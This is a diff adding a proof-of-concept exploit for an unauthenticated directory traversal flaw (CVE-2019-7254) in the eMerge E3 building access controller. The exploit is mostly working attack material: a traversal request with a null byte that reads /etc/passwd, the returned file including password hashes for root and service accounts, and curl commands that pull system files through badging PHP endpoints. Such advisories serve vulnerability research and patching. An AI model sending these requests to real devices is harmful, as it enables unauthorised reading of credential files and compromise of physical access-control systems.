@@ -1,0 +1,42 @@
+# Exploit Title: eMerge E3 1.00-06 - Unauthenticated Directory Traversal
+# Google Dork: NA
+# Date: 2018-09-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
+# Software Link: http://linear-solutions.com/nsc_family/e3-series/
+# Version: 1.00-06
+# Tested on: NA
+# CVE : CVE-2019-7254
+# Advisory: https://applied-risk.com/resources/ar-2019-009
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# Advisory: https://applied-risk.com/resources/ar-2019-005
+
+# PoC
+
+GET /?c=../../../../../../etc/passwd%00
+Host: 192.168.1.2
+
+root:$1$VVtYRWvv$gyIQsOnvSv53KQwzEfZpJ0:0:100:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/adm:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:
+news:x:9:13:news:/var/spool/news:
+uucp:x:10:14:uucp:/var/spool/uucp:
+operator:x:11:0:operator:/root:
+games:x:12:100:games:/usr/games:
+gopher:x:13:30:gopher:/usr/lib/gopher-data:
+ftp:x:14:50:FTP User:/home/ftp:
+nobody:x:99:99:Nobody:/home/default:
+e3user:$1$vR6H2PUd$52r03jiYrM6m5Bff03yT0/:1000:1000:Linux User,,,:/home/e3user:/bin/sh
+lighttpd:$1$vqbixaUx$id5O6Pnoi5/fXQzE484CP1:1001:1000:Linux User,,,:/home/lighttpd:/bin/sh
+
+
+curl -s http://192.168.1.3/badging/badge_print_v0.php?tpl=../../../../../etc/passwd
+curl -s http://192.168.1.2/badging/badge_template_print.php?tpl=../../../../../etc/version
+curl -s http://192.168.1.2/badging/badge_template_v0.php?layout=../../../../../../../etc/issue
+curl -s http://192.168.1.2/?c=../../../../../../etc/passwd%00
